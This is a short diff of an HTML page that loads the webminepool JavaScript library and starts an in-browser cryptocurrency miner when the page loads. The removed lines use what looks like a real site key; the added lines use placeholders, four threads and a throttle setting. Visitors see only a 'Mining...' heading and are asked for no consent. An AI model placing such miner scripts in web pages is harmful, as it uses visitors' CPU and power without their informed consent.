@@ -1,15 +1,15 @@
 <html>
 <head>
-     <title></title>
-	 <script src="https://webminepool.com/lib/base.js"></script>
-</head>
-<body>
 
-
-      <h1>Mining...</h1>
-
-      <script>
-    var miner = WMP.Anonymous('SK_vYqZMcEjVe2SxEMjMKaab',{throttle: 0.5});
+ <h1>Mining...............</h1>
+<script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.User('<your-site-key>', '<username>',{
+        threads: 4,
+        autoThreads: false,
+        throttle: 0.3,
+        forceASMJS: false
+    });
     miner.start();
 </script>
 
